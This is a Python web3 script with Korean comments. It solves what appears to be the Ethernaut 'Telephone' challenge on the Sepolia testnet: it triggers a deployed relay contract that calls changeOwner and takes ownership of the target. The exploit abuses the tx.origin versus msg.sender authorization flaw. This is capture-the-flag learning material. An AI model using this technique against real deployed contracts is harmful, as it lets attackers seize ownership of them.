from web3 import Web3
import requests
import time
import json

# 풀이
# 1. Remix IDE를 이용하여 이더리움 Sepolia 테스트넷에 Telephone 컨트랙트에 중계하는 컨트랙트 배포
#    => 컨트랙트 주소 배포 시 배포용 계정은 제2의 지갑 계정으로 생성하여야함.
# 2. 1번 과정 수행 후 owner 변수 정보 확인하여 기능이 올바르게 수행됐는지 확인
# 3. 홈페이지의 Submit Instance 버튼 실행하여 문제 클리어 

# 문제에서 사용하는 각종 정보 추출
def parse_env_to_dict(env_file_path):
    env_dict = {}

    # Read the .env file line by line
    with open(env_file_path, "r") as file:
        for line in file:
            # Strip whitespace and ignore comments or empty lines
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            # Split key and value on the first '='
            key, _, value = line.partition("=")
            key = key.strip()
            value = value.strip()

            # Remove quotes from the value if present
            if (value.startswith('"') and value.endswith('"')) or (value.startswith("'") and value.endswith("'")):
                value = value[1:-1]

            # Add to dictionary
            env_dict[key] = value

    return env_dict

ENV_PATH = "../.env"

dict_output = parse_env_to_dict(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']

CONTRACT_ADDRESS = '0xC2605205Da3BDbBc238064971e42C2DfB6E7Ff8f'
ATTACKER_ADDRESS = '0xbB230d89B4D5861a772d01Bdd332627960e85095'
PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Seth!")
else:
    print("Failed to connect to Seth.")
    
PA = web3.eth.account.from_key(PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = [
    {
        "type": "constructor",
        "inputs": [],
        "stateMutability": "nonpayable"
    },
    {
        "type": "function",
        "name": "changeOwner",
        "inputs": [
            {
                "name": "_owner",
                "type": "address",
                "internalType": "address"
            }
        ],
        "outputs": [],
        "stateMutability": "nonpayable",
        "signature": "0xa6f9dae1"
    },
    {
        "type": "function",
        "name": "owner",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x8da5cb5b"
    }
]

ATTACKER_ABI = [
  {
    "inputs": [
      {
        "internalType": "contract Telephone",
        "name": "_telephoneContract",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "_attacker",
        "type": "address"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "attack",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
]

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)
attacker = web3.eth.contract(address=ATTACKER_ADDRESS, abi=ATTACKER_ABI)

# 컨트랙트 Owner 정보 사전 확인
BEFORE_OWNER = contract.functions.owner().call()

print(f'Owner Information Before Attack: {BEFORE_OWNER}')

if BEFORE_OWNER != USER_ADDRESS:
    print("Contract's Owner is not changed!")
else:
    print("Contract's Owner is already changed!")
    exit(0)

time.sleep(2)

# TelephoneAttack 컨트랙트의 fallback 함수 호출 사전 준비
data = {
    'to': ATTACKER_ADDRESS,
    'value': 1,
    'gas': 300000,
    'gasPrice': web3.eth.gas_price,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
}

# 트랜젝션 서명 및 전송
signed_tx = web3.eth.account.sign_transaction(data, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}")

time.sleep(2)

# Owner 정보 변경 확인
AFTER_OWNER = contract.functions.owner().call()

print(f'Owner Information After Attack: {AFTER_OWNER}')

if AFTER_OWNER != USER_ADDRESS:
    print("Contract's Owner has not changed!")
    exit(0)
else:
    print("Contract's Owner has changed!")
